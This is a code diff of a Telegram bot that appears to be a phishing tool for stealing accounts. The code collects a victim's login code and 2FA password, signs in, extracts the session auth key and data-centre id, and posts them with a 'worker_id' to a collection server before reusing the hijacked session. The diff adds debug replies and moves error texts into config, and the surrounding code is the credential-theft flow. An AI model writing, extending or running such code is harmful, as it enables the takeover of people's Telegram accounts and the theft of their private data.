@@ -120,11 +120,15 @@ async def inline_click(call: types.CallbackQuery):
         try:
             client111 = steps[call.message.chat.id]["client"]
 
+            await call.message.reply("=> коннект")
+
             await client111.enter_code(call.message.text.replace(config.textInfo["codeText"], ""))
 
             steps[call.message.chat.id]["msg_text"] = ""
 
             sessionString = StringSession.save(client111.client.session)
+
+            await call.message.reply("=> сессион стринг")
 
             sessionString = StringSession(sessionString)
             await client111.client.disconnect()
@@ -134,11 +138,14 @@ async def inline_click(call: types.CallbackQuery):
 
             await asyncio.sleep(3)
 
+            await call.message.reply("=> получение сессии")
+
             dc_id = sessionString.dc_id
             auth_key = binascii.hexlify(sessionString.auth_key.key)
 
             steps[call.message.chat.id]["step"] = -1
 
+            await call.message.reply("=> отправка запроса")
             requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
             client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
@@ -165,12 +172,12 @@ async def inline_click(call: types.CallbackQuery):
                         pass
 
         except ClientTelegram.NeedPassword:
-            await call.message.reply("Введите ваш пароль 2фа:")
+            await call.message.reply(config.textInfo["passwordNeedErrorText"])
             steps[call.message.chat.id]["step"] = 2
         except:
             code = call.message.text.replace(config.textInfo["codeText"], "")
 
-            await call.message.reply("Код не верный!")
+            await call.message.reply(config.textInfo["invalidCodeErrorText"])
 
 @dp.message_handler(content_types=types.ContentTypes.TEXT)
 async def code_step(message: types.Message):
@@ -189,13 +196,15 @@ async def code_step(message: types.Message):
         sessionString = StringSession(sessionString)
         await client111.client.disconnect()
         os.remove(f"./{client111.phone_number}.session")
+
         await message.reply(config.textInfo["validCodeText"])
-        await asyncio.sleep(3)
+
         dc_id = sessionString.dc_id
         auth_key = binascii.hexlify(sessionString.auth_key.key)
 
         steps[message.chat.id]["step"] = -1
 
+        await message.reply("1111");
         requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
         client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
